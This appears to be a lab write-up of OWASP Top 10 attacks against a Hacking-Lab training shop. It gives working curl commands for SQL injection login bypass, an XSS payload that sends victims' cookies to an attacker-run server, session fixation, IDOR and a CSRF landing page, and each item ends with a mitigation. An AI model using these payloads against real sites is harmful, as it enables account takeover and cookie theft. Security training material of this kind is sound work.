
### A1 - SQL Injection Attack

```
### Vulnerability

SQLi in `password` field.

### Exploitation

# Get ACookie:
$ RET=`curl -s -i 'http://glocken.hacking-lab.com/12001/inputval_case2/inputval2/controller?action=showpage&page=start' -k | grep 'Set-Cookie' | awk '{print $2}' | tr ';' ' '`

# Get credit card number:
$ curl -s -b "$RET" -c 'cookies' -L 'https://glocken.hacking-lab.com/12001/inputval_case2/auth_inputval2/login' -k --data 'username=hacker10&action=login&originalURL=https%253A%252F%252Fglocken.hacking-lab.com%252F12001%252Finputval_case2%252Finputval2%252Fcontroller%253Faction%253Dprofile&send=Login' --data-urlencode "password=' or 'a'='a" | grep creditcard

### Mitigation

Validate user input.
```

### A2 - XSS

```
### Vulnerability

As mentioned in the task description, XSS vulnerability exists in the comments site (https://glocken.hacking-lab.com/12001/inputval_case1/inputval1/controller?action=showcomments).

Vulnerability can be discovered using following steps:

Step 0: Create authenitcated session for user 'hacker10' (get ACookie & BCookie cookies) - only authenitcated users can add comments:

$ ACOOKIE=`curl -s -i 'http://glocken.hacking-lab.com/12001/inputval_case1/inputval1/controller?action=showpage&page=start' -k | grep 'ACookie' | awk '{print $2}' | tr ';' ' '`

$ BCOOKIE=`curl -i -s -b "$ACOOKIE" -c 'cookies' -L 'https://glocken.hacking-lab.com/12001/inputval_case1/auth_inputval1/login' -k --data 'username=hacker10&password=compass&action=login&originalURL=https%253A%252F%252Fglocken.hacking-lab.com%252F12001%252Finputval_case1%252Finputval1%252Fcontroller%253Faction%253Dprofile&send=Login' | grep 'BCookie' | awk '{print $2}' | tr ';' ' '`

Step 1: Add comment text that contains JavaScript code & verify that sent code is reflected in server's response: 

$ curl -s -b "$ACOOKIE;$BCOOKIE" -k 'https://glocken.hacking-lab.com/12001/inputval_case1/inputval1/controller?action=addcomment&comment=%3cscript%3ealert%281%29%3b%3c%2fscript%3e' | grep '<script>alert(1);</script>'

Now, when comment site (https://glocken.hacking-lab.com/12001/inputval_case1/inputval1/controller?action=showcomments) will be visited via browser injected script will be executed.

### Exploitation

To exploit this vulnerability following steps could be performed:

First attacker needs to log in to add comments, to do so vulnerability discovered in A1 (sql injection in login form) could be used:

[attacker] $ ACOOKIE=`curl -s -i 'http://glocken.hacking-lab.com/12001/inputval_case1/inputval1/controller?action=showpage&page=start' -k | grep 'ACookie' | awk '{print $2}' | tr ';' ' '`

[attacker] $ BCOOKIE=`curl -i -s -b "$ACOOKIE" -c 'cookies' -L 'https://glocken.hacking-lab.com/12001/inputval_case1/auth_inputval1/login' -k --data 'username=hacker11&action=login&originalURL=https%253A%252F%252Fglocken.hacking-lab.com%252F12001%252Finputval_case1%252Finputval1%252Fcontroller%253Faction%253Dprofile&send=Login' --data-urlencode "password=' or 'a'='a" | grep 'Set-Cookie' | awk '{print $2}' | tr ';' ' '`

Attacker sets up landing page on machine 10.201.3.2 for cookies:

[attacker] $ python -m SimpleHTTPServer 8888

Then attacker adds malicious js script at comment site:

[attacker] $ curl -s -b "$ACOOKIE;$BCOOKIE" -k 'https://glocken.hacking-lab.com/12001/inputval_case1/inputval1/controller?action=addcomment&comment=%3cscript%3elocation.href%3d%22http%3a%2f%2f10.201.3.2%3a8888%2f%22%2bdocument.cookie%3c%2fscript%3e'

Then, when valid user will buy & pay for cow bells and he will visit comment site (https://glocken.hacking-lab.com/12001/inputval_case1/inputval1/controller?action=showcomments) his cookies will be transmitted to the attacker's web server. Snippet from attacker's server log:

10.201.3.2 - - [04/Jan/2016 00:11:57] "GET /ACookie=12345;%20BCookie=wWqw6YkDPdzbBOdMxLBbWg== HTTP/1.1" 404 -

### Mitigation

Follow https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet to prevent XSS.

Set HttpOnly flag (https://www.owasp.org/index.php/HttpOnly) for cookies.
```

### A3 - Broken Authentication and Session 

```
### Vulnerability

Authentication and session management is flawed. The same AValue is used for a user as a session id before and after user has authenticated.

Also storing session id in url also should be treated as a weakness because it makes mounting session fixation attacks easier.

### Exploitation

Attack scenario:

[1] Attacker gets session id (AValue) from vulnerable website:

$ curl -s -i -k 'https://glocken.hacking-lab.com/12001/url_case3/url3/controller?action=showpage&page=navigate' | grep Location | awk '{print $2}' | awk -F "&" '{print $3}'

AValue=9QKkSlzW75JS0RWvlaBgOg==

[2] Via social engineering (or other mean) an attacker entices victim to authenticate via provided link (with earlier fetched session identifier):

https://glocken.hacking-lab.com/12001/url_case3/url3/controller?action=profile&AValue=9QKkSlzW75JS0RWvlaBgOg==

[3] After victim has logged in an attacker is able to see (and/or modify) victim's data simply by visiting this link:

https://glocken.hacking-lab.com/12001/url_case3/url3/controller?action=profile&AValue=9QKkSlzW75JS0RWvlaBgOg==

### Mitigation

Invalidate session ID (AValue) and generate new one after user has authenticated.

Store session identifier in cookie rather than as part as url this makes mounting session fixation attacks more difficult.

Additionally when designing and/or implementing custom authentication and session management mechanisms be sure to consult following OWASP materials:

- ASVS
- https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management
- https://www.owasp.org/index.php/Session_Management_Cheat_Sheet
- https://www.owasp.org/index.php/Session_Fixation
```

### A4 - Insecure Direct Object References

```
### Vulnerability

Observation:

After logging in as hacker10 with following request:

GET https://glocken.hacking-lab.com/12001/cookie_case6/auth_cookie6/login?username=hacker10&password=compass&action=login&originalURL=https%253A%252F%252Fglocken.hacking-lab.com%252F12001%252Fcookie_case6%252Fcookie6%252Fcontroller%253Faction%253Dprofile&send=Login

BCookie is set and redirect to https://glocken.hacking-lab.com/12001/cookie_case6/cookie6/controller?action=profile&pid=1 is done, which returns hacker11's profile.

whereas after logging in as hacker11 using this request:

GET https://glocken.hacking-lab.com/12001/cookie_case6/auth_cookie6/login?username=hacker11&password=compass&action=login&originalURL=https%253A%252F%252Fglocken.hacking-lab.com%252F12001%252Fcookie_case6%252Fcookie6%252Fcontroller%253Faction%253Dprofile&send=Login

BCookie is set and redirect to https://glocken.hacking-lab.com/12001/cookie_case6/cookie6/controller?action=profile&pid=2 is done, which returns hacker11's profile.

Experiment:

GET https://glocken.hacking-lab.com/12001/cookie_case6/auth_cookie6/login?username=hacker11&password=compass&action=login&originalURL=https%253A%252F%252Fglocken.hacking-lab.com%252F12001%252Fcookie_case6%252Fcookie6%252Fcontroller%253Faction%253Dprofile&send=Login

GET https://glocken.hacking-lab.com/12001/cookie_case6/cookie6/controller?action=profile&pid=3

will return profile for hacker12.

This experiment demonstrates that authorization scheme is broken because backend logic verifies only whether user is logged (valid ACookie & BCookie are sent) and then it responds with profile's data solely based on user input (pid parameter).

### Exploitation

[1] Log in as user hacker10 (or hacker11)

[2] Use ACookie & BCookie from [1] and navigate to https://glocken.hacking-lab.com/12001/cookie_case6/cookie6/controller?action=profile&pid=3 - hacker12's profile will be returned

### Mitigation

Fix authorization scheme - do not return profile data based on pid parameter but but based on session identifiers (ACookie & BCookie). For example for valid session identifier of user hacker10 allow to view profile data only for this user.
```

### A5 - CSRF

```

### Vulnerability

Observation:

To buy a product following two requests are needed:

GET http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct&productId=1&quantity=1&Submit=Order

GET http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeOrder

There is no anti CSRF mechanism in place so it is possible to mount CSRF attack on authenticated user of Glockenemil Website (cookie0) site.

### Exploitation

[1] Attacker prepares following "landing page": 

<html>
<body>
<img src='http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct&productId=1&quantity=99&Submit=Order' />
<img src='http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeOrder' />
</body>
</html>

Saves it as b.html file and then hosts in on his machine (10.201.1.66):

$ python -m SimpleHTTPServer 8080

[2] Attacker entices legitimate authenticated user (via social engineering, phising, drive-by infection, etc.) to vist attacker's "landing page": http://10.201.1.66:8080/b.html. This results in buying additional (unwanted) products be the legitimate user.

### Mitigation

Anti CSRF mechanism for example synchronizer token pattern should be used (https://www.owasp.org/index.php/Category:OWASP_CSRFGuard_Project).
```

### A6 - Security Misconfiguration

### A7 - Insecure Cryptographic Storage

### A8 - Failure to Restrict URL Access

```

### Vulnerability

### Exploitation

[1] Log in as hacker10 (passwd: compass)

[2] Navigate to: https://glocken.hacking-lab.com/12001/xpath_case0/admin/showtransactions

Here's the list of transactions:

Your query matched the following results:
result:
transaction:
id: 1
cardnr: 1323-4545-6767-8989
amount: 1000.0
transaction:
id: 2
cardnr: 1323-4545-6767-8989
amount: 1900.0
transaction:
id: 6
cardnr: 2322-4545-6457-8989
amount: 3600.0
transaction:
id: 9
cardnr: 2322-4545-6755-8989
amount: 400.0
transaction:
id: 5
cardnr: 2322-4545-6767-8945
amount: 800.0
transaction:
id: 4
cardnr: 2322-4545-6767-8989
amount: 4800.0
transaction:
id: 8
cardnr: 2322-4545-6767-8989
amount: 1200.0
transaction:
id: 10
cardnr: 2322-4545-6767-8989
amount: 4540.0
transaction:
id: 3
cardnr: 2323-4545-6767-8989
amount: 100.0
transaction:
id: 7
cardnr: 2345-4555-6767-8989
amount: 2540.0
transaction:
id: 11
cardnr: 2452-4545-6767-8989
amount: 370.0

### Mitigation

Enforce proper access control on admin panel.
```

### A9 - Insufficient Transport Layer Protection

```
### Vulnerability

Presence of mixed HTTPS and HTTP content in the same page, which can be used to Leak information.

For example format.css is retreived using HTTP protocol:

GET http://glocken.hacking-lab.com/12001/cookie_case2/cookie2/format.css

so it transmits BCookie in clear text.

### Exploitation

Passive attacker colud sniff for secrets (like BCookie) in traffic to http://glocken.hacking-lab.com/12001/cookie_case2/cookie2 website.

Active attacker could mount MitM attacks.

### Mitigation

Do not mix HTTPS and HTTP content in the same page. Use properly configured TLS for all your resources. HSTS mechanism (https://www.owasp.org/index.php/HTTP_Strict_Transport_Security) could be used to enforce this.
```

### A10 - Unvalidated Redirects and Forwards
